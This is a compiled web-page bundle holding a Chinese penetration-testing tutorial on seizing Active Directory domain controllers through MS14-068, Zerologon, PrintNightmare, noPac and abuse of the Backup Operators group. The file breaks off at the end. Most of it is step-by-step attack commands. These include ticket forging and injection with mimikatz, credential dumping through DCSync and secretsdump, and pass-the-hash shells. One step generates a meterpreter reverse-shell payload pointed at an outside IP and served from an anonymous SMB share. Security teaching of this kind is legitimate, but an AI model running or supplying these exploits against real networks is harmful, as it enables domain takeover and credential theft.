import{_ as l}from"./_plugin-vue_export-helper.cdc0426e.js";import{o as r,c as d,a as s,b as e,d as i,e as a,r as c}from"./app.0655d585.js";const t={},o=a(`<div class="custom-container tip"><p class="custom-container-title">针对不同的域控环境，攻击域控制器获取域管理权限的方式</p><p>1）通过抓取域管登陆服务器的hash（不断抓HASH+PTH攻击）</p><p>2）通过运维人员不恰当的密码管理（弱口令、Wiki系统等记录域高权限账户）</p><p>3）通过域控相关的漏洞</p><p>4）通过域内的中继（域控中存在强制NTLM认证漏洞，在其中做NTLM中继获取域控制权限）</p><p>5）通过委派来获取域控权限</p></div><h2 id="域漏洞" tabindex="-1"><a class="header-anchor" href="#域漏洞" aria-hidden="true">#</a> 域漏洞</h2><h3 id="ms14068-cve-2008-4037" tabindex="-1"><a class="header-anchor" href="#ms14068-cve-2008-4037" aria-hidden="true">#</a> MS14068（CVE-2008-4037）</h3><details class="custom-container details"><summary>漏洞概述</summary><p>域里面最严重的漏洞之一，它允许任意用户提升到域管权限。该漏洞最本质在于<code>Kerberos KDC</code>无法正确检查<code>Kerberos</code>票证请求随附的特权属性证书（PAC）中的有效签名，导致用户可以自己构造一张PAC。</p><div class="language-http line-numbers-mode" data-ext="http"><pre class="language-http"><code>影响范围

Windows Server 2003/2008/2012
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details><h4 id="_1-测试访问域控" tabindex="-1"><a class="header-anchor" href="#_1-测试访问域控" aria-hidden="true">#</a> 1）测试访问域控</h4><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">dir</span> <span class="token punctuation">\\</span><span class="token punctuation">\\</span>dc1.dtsec.lab<span class="token punctuation">\\</span>c$

<span class="token comment">#显示拒绝访问</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="_2-清空票据缓存" tabindex="-1"><a class="header-anchor" href="#_2-清空票据缓存" aria-hidden="true">#</a> 2）清空票据缓存</h4><p>域用户由于存在本身缓存的<code>tgt</code>，在打exp前需要先<code>klist purge</code></p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>klist
klist purge
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="_3-获取本机用户的sid" tabindex="-1"><a class="header-anchor" href="#_3-获取本机用户的sid" aria-hidden="true">#</a> 3）获取本机用户的SID</h4><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>whoami/all

<span class="token comment">#用户名          SID</span>
<span class="token comment">#=============== =============================================</span>
<span class="token comment">#dtsec\\liangchen S-1-5-21-3814579517-564282474-2733855526-1104</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="_4-伪造证书" tabindex="-1"><a class="header-anchor" href="#_4-伪造证书" aria-hidden="true">#</a> 4）伪造证书</h4>`,12),p={href:"https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068",target:"_blank",rel:"noopener noreferrer"},m=a(`<div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>MS14-068.exe <span class="token parameter variable">-u</span> liangchen@dtsec.lab <span class="token parameter variable">-p</span> lcmjnht123NB <span class="token parameter variable">-s</span> S-1-5-21-3814579517-564282474-2733855526-1104 <span class="token parameter variable">-d</span> dc1.dtsec.lab
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h4 id="_5-注入票据" tabindex="-1"><a class="header-anchor" href="#_5-注入票据" aria-hidden="true">#</a> 5）注入票据</h4><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>mimikatz.exe <span class="token string">&quot;kerberos::ptc TGT_liangchen@dtsec.lab.ccache&quot;</span> <span class="token builtin class-name">exit</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h4 id="_6-连接域控" tabindex="-1"><a class="header-anchor" href="#_6-连接域控" aria-hidden="true">#</a> 6）连接域控</h4><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment">#权限测试</span>
net use <span class="token punctuation">\\</span><span class="token punctuation">\\</span>dc1.dtsec.lab<span class="token punctuation">\\</span>admin$  
<span class="token function">dir</span> <span class="token punctuation">\\</span><span class="token punctuation">\\</span>dc1.dtsec.lab<span class="token punctuation">\\</span>c$

<span class="token comment">#获取Shell</span>
<span class="token comment">#https://github.com/crupper/Forensics-Tool-Wiki/tree/master/windowsTools</span>
psexec.exe <span class="token punctuation">\\</span><span class="token punctuation">\\</span>dc1.dtsec.lab cmd.exe
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="zerologon-cve-2020-1472" tabindex="-1"><a class="header-anchor" href="#zerologon-cve-2020-1472" aria-hidden="true">#</a> Zerologon（CVE-2020-1472）</h3><details class="custom-container details"><summary>漏洞概述</summary><p>Netlogon是Windows Server进程，用于对域中的用户和其他服务进行身份验证。攻击者在通过NetLogon（MS-NRPC）协议与AD域控建立安全通道时，可利用该漏洞将AD域控的计算机账号密码置为空，从而控制域控服务器。</p><div class="language-http line-numbers-mode" data-ext="http"><pre class="language-http"><code>影响范围

Windows Server 2019
Windows Server 2016
Windows Server 2012 R2
Windows Server 2012
Windows Server 2008 R2
Windows Server 2008
Windows Server 2003 R2
Windows Server 2003
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details><h4 id="_1-用密码导出域控hash对比" tabindex="-1"><a class="header-anchor" href="#_1-用密码导出域控hash对比" aria-hidden="true">#</a> 1）用密码导出域控HASH对比</h4><p>仅用作对比，实际渗透无需这一步</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>proxychains secretsdump.py dtsec.lab/Administrator:<span class="token string">&#39;2012version@2021pass&#39;</span>@10.68.35.111 -just-dc

<span class="token comment">#Administrator:500:aad3b435b51404eeaad3b435b51404ee:485690e8d2950fae63188a2043a283d6:::</span>
<span class="token comment">#Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span>
<span class="token comment">#krbtgt:502:aad3b435b51404eeaad3b435b51404ee:35979bcdcf5a21465bbde6eaa90568be:::</span>
<span class="token comment">#DC1$:1001:aad3b435b51404eeaad3b435b51404ee:33060ebc1169ad2b0c19cc5cdba4a5b8:::</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="_2-使用exp将机器账户重置" tabindex="-1"><a class="header-anchor" href="#_2-使用exp将机器账户重置" aria-hidden="true">#</a> 2）使用EXP将机器账户重置</h4>`,11),u={href:"https://github.com/dirkjanm/CVE-2020-1472",target:"_blank",rel:"noopener noreferrer"},v=a(`<div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>python cve-2020-1472-exploit.py dc1$ <span class="token number">10.68</span>.35.111
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>可再导一次hash，看看密码是否为空</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment">#DC1$:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: 空密码</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h4 id="_3-dcsync导出域用户凭据" tabindex="-1"><a class="header-anchor" href="#_3-dcsync导出域用户凭据" aria-hidden="true">#</a> 3）DCSync导出域用户凭据</h4><p>域控的机器账户可以使用DCSync导出域内所有用户凭据</p><p>利用DRS(Directory Replication Service,目录复制服务)协议通过IDL_DRSGetNCChanges从域控制器复制用户凭据。</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment">#导出所有用户的凭据</span>
proxychains secretsdump.py dtsec.lab/dc1<span class="token punctuation">\\</span><span class="token variable">$@</span><span class="token number">10.68</span>.35.111 -no-pass

<span class="token comment">#只看域控本地管理员凭证</span>
proxychains secretsdump.py dtsec.lab/dc1<span class="token punctuation">\\</span><span class="token variable">$@</span><span class="token number">10.68</span>.35.111 -no-pass -just-dc <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">&#39;Administrator&#39;</span>

<span class="token comment">#Administrator:500:aad3b435b51404eeaad3b435b51404ee:485690e8d2950fae63188a2043a283d6:::</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="_4-hash传递打域控" tabindex="-1"><a class="header-anchor" href="#_4-hash传递打域控" aria-hidden="true">#</a> 4）HASH传递打域控</h4><p>然后使用wmic利用HASH传递 拿到域控制器中的本地管理员权限(域管)，可添加账户</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>proxychains wmiexec.py <span class="token parameter variable">-codec</span> gbk <span class="token parameter variable">-hashes</span> aad3b435b51404eeaad3b435b51404ee:485690e8d2950fae63188a2043a283d6 dtsec.lab/Administrator@10.68.35.111

<span class="token comment">#[!] Launching semi-interactive shell - Careful what you execute</span>
<span class="token comment">#[!] Press help for extra shell commands</span>
<span class="token comment">#C:\\&gt;whoami</span>
<span class="token comment">#dtsec\\administrator</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="_5-恢复dc-机器账户的密码" tabindex="-1"><a class="header-anchor" href="#_5-恢复dc-机器账户的密码" aria-hidden="true">#</a> 5）恢复DC$机器账户的密码</h4><p>拷贝SAM数据回来</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>reg save HKLM<span class="token punctuation">\\</span>SYSTEM system.save
reg save HKLM<span class="token punctuation">\\</span>SAM sam.save
reg save HKLM<span class="token punctuation">\\</span>SECURITY security.save

<span class="token comment">#把导出的数据下载回来</span>

del /f system.save
del /f sam.save
del /f security.save
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>提取出机器账号的<code>明文hex</code></p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>secretsdump.py <span class="token parameter variable">-sam</span> sam.save <span class="token parameter variable">-system</span> system.save <span class="token parameter variable">-security</span> security.save LOCAL

<span class="token comment">#$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:33060ebc1169ad2b0c19cc5cdba4a5b8</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>恢复域控机器账户的密码</p>`,16),b=s("code",null,"reinstall_original_pw.py",-1),h={href:"https://github.com/risksense/zerologon",target:"_blank",rel:"noopener noreferrer"},g=a(`<div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>proxychains python reinstall_original_pw.py DC1<span class="token punctuation">\\</span>$ <span class="token number">10.68</span>.35.111 33060ebc1169ad2b0c19cc5cdba4a5b8
<span class="token comment">#Success! DC machine account should be restored to it&#39;s original value. You might want to secretsdump again to check.</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>再用空密码导出hash试试，不能成功就是恢复了</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>proxychains secretsdump.py dtsec.lab/dc1<span class="token punctuation">\\</span><span class="token variable">$@</span><span class="token number">10.68</span>.35.111 -no-pass
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3 id="print-spooler-cve-2021-1675" tabindex="-1"><a class="header-anchor" href="#print-spooler-cve-2021-1675" aria-hidden="true">#</a> Print Spooler（CVE-2021-1675）</h3><details class="custom-container details"><summary>漏洞概述</summary><p>这个漏洞级别属于稍次于<code>Zerologon</code>的打域利器之一；</p><p>Print Spooler是Windows系统中管理打印相关事务的服务，用于管理所有本地和网络打印队列并控制所有打印工作。Windows系统默认开启 Print Spooler 服务，普通用户可以利用此漏洞提升至SYSTEM管理权限。</p><div class="language-http line-numbers-mode" data-ext="http"><pre class="language-http"><code>影响范围

Windows Server 2019
Windows Server 2016
Windows Server 2012
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>利用条件</p><ol><li>一个普通域账号/或者机器账号权限 (可账号密码或者hash)</li><li>pDriverPath 知道一个驱动的绝对路径,和系统版本有关</li></ol><div class="language-http line-numbers-mode" data-ext="http"><pre class="language-http"><code>CVE编号：CVE-2021-1675、CVE-2021-34527
补丁号：KB5003671、KB5003681
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>有安全研究员在github上公开了&quot;CVE-2021-1675&quot;的exp PrintNightmare，后经验证公开的exp是一个与CVE-2021-1675不同的漏洞，微软为其分配了新的编号CVE-2021-34527。</p></details><p>用到了<code>impacket</code>工具包</p><p><strong>扫描域控是否开启了 Print Spooler 服务</strong></p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>rpcdump.py @10.68.35.112 <span class="token operator">|</span> <span class="token function">egrep</span> <span class="token string">&#39;MS-RPRN|MS-PAR&#39;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h4 id="本地提权" tabindex="-1"><a class="header-anchor" href="#本地提权" aria-hidden="true">#</a> 本地提权</h4>`,9),k={href:"https://github.com/calebstewart/CVE-2021-1675/blob/main/CVE-2021-1675.ps1",target:"_blank",rel:"noopener noreferrer"},C=a(`<p>在本地管理员组添加一个用户</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment">#打开PowerShell</span>
Import-Module .CVE-2021-1675.ps1
Invoke-Nightmare <span class="token parameter variable">-DriverName</span> <span class="token string">&quot;prtest&quot;</span> <span class="token parameter variable">-NewUser</span> <span class="token string">&quot;admin886&quot;</span> <span class="token parameter variable">-NewPassword</span> <span class="token string">&quot;@admin.886&quot;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="远程提权" tabindex="-1"><a class="header-anchor" href="#远程提权" aria-hidden="true">#</a> 远程提权</h4><p><strong>1）SMB 设置-攻击载荷托管</strong></p><p>托管有效负载的最简单方法是使用samba并修改<code>/etc/samba/smb.conf</code>以允许匿名访问</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">mv</span> /etc/samba/smb.conf /etc/samba/smb.conf.bak
<span class="token function">cat</span> <span class="token operator">&gt;&gt;</span> /etc/samba/smb.conf <span class="token operator">&lt;&lt;</span> <span class="token string">EOF
[global]
    map to guest = Bad User
	server role = standalone server
	usershare allow guests = yes
	idmap config * : backend = tdb
	smb ports = 445

[smb]
    comment = Samba
    path = /tmp/
    guest ok = yes
    read only = no
    browsable = yes
    force user = nobody
EOF</span>

systemctl restart smb.service
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>Windows</strong></p><p>管理员权限powershell执行以下命令</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">mkdir</span> C:<span class="token punctuation">\\</span>share
icacls C:<span class="token punctuation">\\</span>share<span class="token punctuation">\\</span> /T /grant Anonymous\` logon:r
icacls C:<span class="token punctuation">\\</span>share<span class="token punctuation">\\</span> /T /grant Everyone:r
New-SmbShare <span class="token parameter variable">-Path</span> C:<span class="token punctuation">\\</span>share <span class="token parameter variable">-Name</span> share <span class="token parameter variable">-ReadAccess</span> <span class="token string">&#39;ANONYMOUS LOGON&#39;</span>,<span class="token string">&#39;Everyone&#39;</span>
REG ADD <span class="token string">&quot;HKLM\\System\\CurrentControlSet\\Services\\LanManServer\\Parameters&quot;</span> /v NullSessionPipes /t REG_MULTI_SZ /d srvsvc /f <span class="token comment">#This will overwrite existing NullSessionPipes</span>
REG ADD <span class="token string">&quot;HKLM\\System\\CurrentControlSet\\Services\\LanManServer\\Parameters&quot;</span> /v NullSessionShares /t REG_MULTI_SZ /d share /f
REG ADD <span class="token string">&quot;HKLM\\System\\CurrentControlSet\\Control\\Lsa&quot;</span> /v EveryoneIncludesAnonymous /t REG_DWORD /d <span class="token number">1</span> /f
REG ADD <span class="token string">&quot;HKLM\\System\\CurrentControlSet\\Control\\Lsa&quot;</span> /v RestrictAnonymous /t REG_DWORD /d <span class="token number">0</span> /f
<span class="token comment"># Reboot</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>2）生成攻击载荷</strong></p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>msfvenom <span class="token parameter variable">-p</span> windows/x64/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">212.129</span>.244.167 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">9001</span> <span class="token parameter variable">-f</span> exe <span class="token parameter variable">-o</span> addCube.dll
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><strong>3）RCE攻击</strong></p>`,12),_={href:"https://github.com/cube0x0/CVE-2021-1675",target:"_blank",rel:"noopener noreferrer"},S=a(`<div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>python CVE-2021-1675.py dtsec.lab/liangchen:lcmjnht666NB@10.68.35.112 <span class="token string">&#39;\\\\212.129.244.167\\smb\\addCube.dll&#39;</span>
python CVE-2021-1675.py dtsec.lab/liangchen:lcmjnht666NB@10.68.35.112 <span class="token string">&#39;C:\\addCube.dll&#39;</span>

<span class="token comment">#后边是攻击载荷路径</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="nopac-cve-2021-42287" tabindex="-1"><a class="header-anchor" href="#nopac-cve-2021-42287" aria-hidden="true">#</a> NoPAC（CVE-2021-42287）</h3>`,2),f={class:"custom-container details"},x=s("summary",null,"漏洞概述",-1),y=s("p",null,[s("code",null,"CVE-2021-42287 & CVE-2021-42278"),e("两个漏洞组合可导致域内普通用户提升至域管权限。")],-1),A=s("p",null,[e("需要对属性 "),s("code",null,"sAMAccountName"),e(" 和 "),s("code",null,"servicePrincipalName"),e(" 具有写权限；")],-1),D={href:"https://www.thehacker.recipes/ad/movement/domain-settings/machineaccountquota",target:"_blank",rel:"noopener noreferrer"},w=a(`<div class="language-http line-numbers-mode" data-ext="http"><pre class="language-http"><code>影响范围

windows Server 2008 - 2022所有版本
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,1),E=a(`<p>漏洞原理如下</p><h4 id="cve-2021-42278" tabindex="-1"><a class="header-anchor" href="#cve-2021-42278" aria-hidden="true">#</a> CVE-2021-42278</h4><p><code>windows</code> 域内的机器账户的名字以 <code>$</code> 结尾，但 DC 没有对域内机器账户名做验证。与 CVE-2021-42287 结合使用，它允许攻击者冒充域控制器账户。</p><h4 id="cve-2021-42287" tabindex="-1"><a class="header-anchor" href="#cve-2021-42287" aria-hidden="true">#</a> CVE-2021-42287</h4><p>在 kerberos 认证过程中，用户要访问某个服务，在获取服务票据 ST 之前，需要申请 TGT票据。</p><p>该漏洞的核心为：当请求的服务票 ST 没有被 KDC 找到时，KDC 会自动在尾部添加 <code>$</code> 重新搜索。</p><p>如果 A 用户获得申请了 TGT，然后删除 A 用户或重命名 A 用户;</p><p>并使用该 TGT 进行 <code>S4U2self</code> 以其它用户身份请求一张 ST 给自己，导致 KDC 在 Account Database 中寻找 <code>A$</code>;</p><p>如果帐户 <code>A$</code> 存在，那么 <code>A</code> 就会像其他用户一样为 <code>A$</code>获得一张服务票据。</p><p>因此，机器账户改名为和 DC 机器账户一样，然后申请 TGT，接着把用户名修改掉，使得 DC 在 <code>TGS_REP</code> 时候找不到该账户，这时会用自己的密钥加密服务票据 ST，然后就得到了一个高权限 ST</p><h4 id="samaccountname" tabindex="-1"><a class="header-anchor" href="#samaccountname" aria-hidden="true">#</a> sAMAccountName</h4><p>SAM-Account-Name 用于支持运行早期版本操作系统的客户端和服务器的登录名，例如 Windows NT 4.0、Windows 95、Windows 98 和 LAN Manager。实际上是以「Domain\\LogonName 」形式命名。</p><p>其 Ldap-Display-Name 为：sAMAccountName，故该组合漏洞又被称为：<code>sAMAccountName spoofing</code></p><p>此处还有一种用户命名属性，是目前域环境中常用的一种：<code>UPN</code>，<strong>userPrincipalName</strong> 属性是用户的登录名。</p><p>属性由 UPN (用户主体) ，这是用户最常见的登录 Windows 名称。 用户通常使用其 UPN 登录到域。</p><p>UPN 由 UPN 前缀（用户帐户名）和 UPN 后缀（DNS 域名）组成。 前缀与后缀以 <code>@</code> 符号相联接。UPN 必须在目录林中的所有安全主体对象之间保持唯一。</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment">#sAMAccountName</span>
DTSEC<span class="token punctuation">\\</span>libai

<span class="token comment">#UPN</span>
libai@dtsec.lab
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="s4u2self" tabindex="-1"><a class="header-anchor" href="#s4u2self" aria-hidden="true">#</a> S4U2self</h4><p>在TGSREQ &amp; TGSREP阶段，用户通过AS_REP拿到的TGT票据，去向KDC申请特定服务的访问权限；</p><p>KDC校验TGT票据，如果校验通过的话，会向用户发送一个TGS票据，之后用户再拿着TGS去访问特定的服务；</p><p>这一阶段，微软引进了两个扩展S4U2SELF和S4U2PROXY。</p><p>S4U2self 使得服务可以代表用户获得针对服务自身的kerberos服务票据。</p><p>这使得服务可以获得用户的授权( 可转发的用户TGS票据)，然后将其用于后期的认证(s4u2proxy)；</p><p>服务代表用户获得针对服务自身的kerberos票据这个过程，服务是不需要用户的凭据的。</p><h4 id="利用步骤" tabindex="-1"><a class="header-anchor" href="#利用步骤" aria-hidden="true">#</a> 利用步骤</h4><p>1）首先使用 impacket 的 <code>addcomputer.py</code>或是 <code>powermad</code>创建一个机器账户</p><p><code>addcomputer.py</code>是利用 <code>SAMR协议</code> 创建机器账户，这个方法所创建的机器账户没有 SPN，所以可以不用清除。</p><p>2）然后清除机器账户的 <code>servicePrincipalName</code> 属性</p><p>3）将机器账户的 <code>sAMAccountName</code>，更改为 DC 的机器账户名字，注意后缀不带 <code>$</code></p><p>4）为机器账户请求 TGT</p><p>5）将机器账户的 <code>sAMAccountName</code> 更改为其他名字，不与步骤 3 重复即可</p><p>6）通过 S4U2self 协议向 DC 请求 ST</p><p>7）DCsync 域控同步</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment">#1 创建一个机器账号</span>
addcomputer.py -computer-name <span class="token string">&#39;ControlledComputer$&#39;</span> -computer-pass <span class="token string">&#39;ComputerPassword&#39;</span> -dc-host DC1 -domain-netbios domain <span class="token string">&#39;domain.local/user1:complexpassword&#39;</span>

<span class="token comment">#2 清除SPN记录</span>
addspn.py <span class="token parameter variable">-u</span> <span class="token string">&#39;domain\\user&#39;</span> <span class="token parameter variable">-p</span> <span class="token string">&#39;password&#39;</span> <span class="token parameter variable">-t</span> <span class="token string">&#39;ControlledComputer$&#39;</span> <span class="token parameter variable">-c</span> DomainController

<span class="token comment">#3 机器账户重命名 (computer -&gt; DC)</span>
renameMachine.py -current-name <span class="token string">&#39;ControlledComputer$&#39;</span> -new-name <span class="token string">&#39;DomainController&#39;</span> -dc-ip <span class="token string">&#39;DomainController.domain.local&#39;</span> <span class="token string">&#39;domain.local&#39;</span>/<span class="token string">&#39;user&#39;</span><span class="token builtin class-name">:</span><span class="token string">&#39;password&#39;</span>

<span class="token comment">#4 为机器账户请求一个TGT</span>
getTGT.py -dc-ip <span class="token string">&#39;DomainController.domain.local&#39;</span> <span class="token string">&#39;domain.local&#39;</span>/<span class="token string">&#39;DomainController&#39;</span><span class="token builtin class-name">:</span><span class="token string">&#39;ComputerPassword&#39;</span>

<span class="token comment">#5 机器账户重命名（不与第三步重复即可）</span>
renameMachine.py -current-name <span class="token string">&#39;DomainController&#39;</span> -new-name <span class="token string">&#39;ControlledComputer$&#39;</span> <span class="token string">&#39;domain.local&#39;</span>/<span class="token string">&#39;user&#39;</span><span class="token builtin class-name">:</span><span class="token string">&#39;password&#39;</span>

<span class="token comment">#6 通过 S4U2self 协议向 DC 请求 ST</span>
<span class="token assign-left variable">KRB5CCNAME</span><span class="token operator">=</span><span class="token string">&#39;DomainController.ccache&#39;</span> getST.py <span class="token parameter variable">-self</span> <span class="token parameter variable">-impersonate</span> <span class="token string">&#39;DomainAdmin&#39;</span> <span class="token parameter variable">-spn</span> <span class="token string">&#39;cifs/DomainController.domain.local&#39;</span> <span class="token parameter variable">-k</span> -no-pass -dc-ip <span class="token string">&#39;DomainController.domain.local&#39;</span> <span class="token string">&#39;domain.local&#39;</span>/<span class="token string">&#39;DomainController&#39;</span>

<span class="token comment">#7 DCSync</span>
<span class="token assign-left variable">KRB5CCNAME</span><span class="token operator">=</span><span class="token string">&#39;DomainAdmin.ccache&#39;</span> secretsdump.py -just-dc-user <span class="token string">&#39;krbtgt&#39;</span> <span class="token parameter variable">-k</span> -no-pass -dc-ip <span class="token string">&#39;DomainController.domain.local&#39;</span> @<span class="token string">&#39;DomainController.domain.local&#39;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="武器化利用" tabindex="-1"><a class="header-anchor" href="#武器化利用" aria-hidden="true">#</a> 武器化利用</h4>`,35),N={href:"https://github.com/cube0x0/noPac",target:"_blank",rel:"noopener noreferrer"},T=a(`<p>这个漏洞需要新建一个机器账户， -mAccount为新建机器账户名，-mPassword为密码</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment">#扫描验证</span>
noPac.exe scan <span class="token parameter variable">-domain</span> dtsec.lab <span class="token parameter variable">-user</span> liangchen <span class="token parameter variable">-pass</span> lcmjnht666NB

<span class="token comment">#利用</span>
noPac.exe <span class="token parameter variable">-domain</span> dtsec.lab <span class="token parameter variable">-user</span> liangchen <span class="token parameter variable">-pass</span> lcmjnht666NB /dc dc1.dtsec.lab /mAccount demol /mPassword pAss123<span class="token operator">!</span> /service cifs /ptt

<span class="token comment">#查看域控文件</span>
<span class="token function">dir</span> <span class="token punctuation">\\</span><span class="token punctuation">\\</span>DC1.dtsec.lab<span class="token punctuation">\\</span>c$

<span class="token comment">#查看内存凭据</span>
klist
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="backup-operators-组成员到域控" tabindex="-1"><a class="header-anchor" href="#backup-operators-组成员到域控" aria-hidden="true">#</a> Backup Operators 组成员到域控</h2><p>企业为了保证域控中的最小权限原则，通常会在域控制器的localgroup中授予一些域用户特殊权限，方便不同人员使用域中的不同能力。</p><p>比如localgroup中的backup operators组中的成员能对域控进行备份，也就能直接导出域控的SAM数据库，从而获取域管hash。</p>`,5),P={href:"https://github.com/mpgn/BackupOperatorToDA",target:"_blank",rel:"noopener noreferrer"};function M(R,V){const n=c("ExternalLinkIcon");return 